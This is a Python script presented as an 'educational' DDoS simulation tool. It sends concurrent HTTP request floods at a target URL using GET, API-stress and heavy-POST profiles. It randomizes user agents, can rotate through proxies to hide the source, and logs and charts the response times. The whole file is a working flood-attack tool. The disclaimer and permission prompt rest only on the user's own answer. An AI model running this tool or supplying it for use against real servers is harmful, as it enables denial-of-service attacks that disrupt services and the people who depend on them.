import asyncio
import aiohttp
import time
import random
import argparse
import json
import logging
from faker import Faker
from dataclasses import dataclass
from typing import Dict, List, Optional
from tqdm.asyncio import tqdm
import matplotlib.pyplot as plt
from colorama import init, Fore, Style
import sys

# Initialize colorama for colored terminal output
init()

# Setup logging
logging.basicConfig(
    filename="ddos_simulation.log",
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    filemode='a'
)

fake = Faker()

@dataclass
class AttackProfile:
    """Defines an attack profile with request characteristics."""
    name: str
    methods: List[str]
    headers: Dict[str, callable]
    payload_generator: callable
    delay_variance: float

    def generate_request(self, request_id: int, url: str, proxies: Optional[List[str]] = None) -> Dict:
        """Generates a single request based on the profile."""
        method = random.choice(self.methods)
        headers = {k: v() if callable(v) else v for k, v in self.headers.items()}
        payload = self.payload_generator()
        proxy = random.choice(proxies) if proxies else None
        return {
            "id": request_id,
            "method": method,
            "url": url,
            "headers": headers,
            "payload": payload,
            "delay_variance": self.delay_variance,
            "proxy": proxy
        }

# Predefined Attack Profiles
ATTACK_PROFILES = {
    "normal": AttackProfile(
        name="Normal Traffic",
        methods=["GET"],
        headers={"User-Agent": lambda: fake.user_agent(), "Accept": "*/*"},
        payload_generator=lambda: None,
        delay_variance=0.1
    ),
    "api_stress": AttackProfile(
        name="API Stress",
        methods=["POST", "PUT"],
        headers={"User-Agent": lambda: fake.user_agent(), "Content-Type": "application/json"},
        payload_generator=lambda: json.dumps({"id": random.randint(1, 1000), "data": fake.text(max_nb_chars=200)}),
        delay_variance=0.05
    ),
    "heavy_load": AttackProfile(
        name="Heavy Load",
        methods=["POST"],
        headers={"User-Agent": lambda: fake.user_agent(), "Content-Length": "1024"},
        payload_generator=lambda: fake.text(max_nb_chars=1024),
        delay_variance=0.02
    )
}

class Metrics:
    """Tracks and summarizes attack metrics."""
    def __init__(self):
        self.success = 0
        self.failure = 0
        self.response_times = []
        self.lock = asyncio.Lock()

    async def record(self, success: bool, response_time: float):
        """Records the outcome of a request."""
        async with self.lock:
            if success:
                self.success += 1
            else:
                self.failure += 1
            self.response_times.append(response_time)

    def summary(self) -> Dict:
        """Returns a summary of collected metrics."""
        total = self.success + self.failure
        avg_time = sum(self.response_times) / len(self.response_times) if self.response_times else 0
        return {
            "total_requests": total,
            "successful_requests": self.success,
            "failed_requests": self.failure,
            "success_rate": (self.success / total) * 100 if total > 0 else 0,
            "avg_response_time": avg_time,
            "min_response_time": min(self.response_times or [0]),
            "max_response_time": max(self.response_times or [0]),
            "response_times": self.response_times
        }

def plot_metrics(metrics: Dict, output_file: str = "attack_response_times.png"):
    """Generates and saves a histogram of response times."""
    plt.figure(figsize=(12, 7))
    plt.hist(metrics["response_times"], bins=30, color='red', alpha=0.7, edgecolor='black')
    plt.title("DDoS Simulation Response Time Distribution", fontsize=16)
    plt.xlabel("Response Time (seconds)", fontsize=12)
    plt.ylabel("Frequency", fontsize=12)
    plt.grid(True, alpha=0.3)
    plt.tight_layout()
    plt.savefig(output_file)
    print(f"{Fore.GREEN}Response time distribution saved as '{output_file}'{Style.RESET_ALL}")

async def send_request(session: aiohttp.ClientSession, req: Dict, metrics: Metrics, rate_limit: float, progress: tqdm):
    """Sends a single HTTP request and records its outcome."""
    try:
        start_time = time.time()
        async with session.request(
            method=req["method"],
            url=req["url"],
            headers=req["headers"],
            data=req["payload"],
            timeout=aiohttp.ClientTimeout(total=5),
            proxy=req["proxy"]
        ) as response:
            elapsed_time = time.time() - start_time
            success = response.status in (200, 201)
            await metrics.record(success, elapsed_time)
            logging.info(f"Request {req['id']}: {req['method']} {req['url']} - Status {response.status} - Time {elapsed_time:.3f}s")
    except aiohttp.ClientError as e:
        elapsed_time = time.time() - start_time
        await metrics.record(False, elapsed_time)
        logging.error(f"Request {req['id']}: {req['method']} {req['url']} - Failed - Error: {str(e)}")
    except asyncio.TimeoutError:
        elapsed_time = time.time() - start_time
        await metrics.record(False, elapsed_time)
        logging.error(f"Request {req['id']}: {req['method']} {req['url']} - Timeout")
    finally:
        progress.update(1)
        await asyncio.sleep(rate_limit + random.uniform(0, req["delay_variance"]))

async def run_attack(url: str, request_count: int, concurrency: int, rate_limit: float, profile_name: str, proxies: Optional[List[str]] = None):
    """Runs the DDoS simulation with the specified parameters."""
    metrics = Metrics()
    profile = ATTACK_PROFILES.get(profile_name, ATTACK_PROFILES["normal"])
    requests_list = [profile.generate_request(i, url, proxies) for i in range(1, request_count + 1)]

    print(f"{Fore.CYAN}\nStarting DDoS simulation on {url}{Style.RESET_ALL}")
    print(f"Profile: {profile.name}, Requests: {request_count}, Concurrency: {concurrency}, Rate Limit: {rate_limit}s")

    async with aiohttp.ClientSession() as session:
        async with tqdm(total=request_count, desc="Attack Progress", unit="req") as progress:
            tasks = [send_request(session, req, metrics, rate_limit, progress) for req in requests_list]
            await asyncio.gather(*tasks[:concurrency])  # Initial concurrent batch
            await asyncio.gather(*tasks[concurrency:])  # Remaining tasks

    return metrics

def execute_attack(url: str, request_count: int, concurrency: int, rate_limit: float, profile_name: str, proxies: Optional[List[str]] = None):
    """Executes the attack and displays results."""
    start_time = time.time()
    try:
        metrics = asyncio.run(run_attack(url, request_count, concurrency, rate_limit, profile_name, proxies))
    except Exception as e:
        print(f"{Fore.RED}Attack failed: {str(e)}{Style.RESET_ALL}")
        logging.critical(f"Attack execution failed: {str(e)}")
        return

    total_time = time.time() - start_time
    summary = metrics.summary()

    print(f"\n{Fore.YELLOW}=== DDoS Simulation Summary ==={Style.RESET_ALL}")
    print("Developed by It Is Unique Official")
    for key, value in summary.items():
        if key != "response_times":
            print(f"{key.replace('_', ' ').title()}: {value:.2f}" if isinstance(value, float) else f"{key.replace('_', ' ').title()}: {value}")
    print(f"Total Time Taken: {total_time:.2f}s")
    
    plot_metrics(summary)
    logging.info(f"Attack completed in {total_time:.2f}s with profile {profile_name}")

def main():
    """CLI entry point for the DDoS simulation tool."""
    parser = argparse.ArgumentParser(
        description="Network-DDoS: Educational DDoS Simulation Tool by It Is Unique Official",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    parser.add_argument("--url", required=True, help="Target URL to simulate attack on")
    parser.add_argument("--requests", type=int, default=500, help="Number of requests to send")
    parser.add_argument("--concurrency", type=int, default=50, help="Number of concurrent connections")
    parser.add_argument("--rate-limit", type=float, default=0.05, help="Minimum delay between requests (seconds)")
    parser.add_argument("--profile", choices=ATTACK_PROFILES.keys(), default="normal", help="Attack profile to use")
    parser.add_argument("--proxies", nargs="*", help="List of proxy URLs (e.g., http://proxy:port)")

    args = parser.parse_args()

    print(f"{Fore.RED}\nWARNING: This tool is for EDUCATIONAL PURPOSES ONLY.{Style.RESET_ALL}")
    print("Use it only on servers you own or have explicit permission to test.")
    print("Unauthorized use is illegal and unethical.\n")
    
    confirm = input(f"{Fore.YELLOW}Do you have permission to test {args.url}? (yes/no): {Style.RESET_ALL}")
    if confirm.lower() != "yes":
        print(f"{Fore.RED}Aborting simulation.{Style.RESET_ALL}")
        sys.exit(1)

    execute_attack(args.url, args.requests, args.concurrency, args.rate_limit, args.profile, args.proxies)

if __name__ == "__main__":
    main()
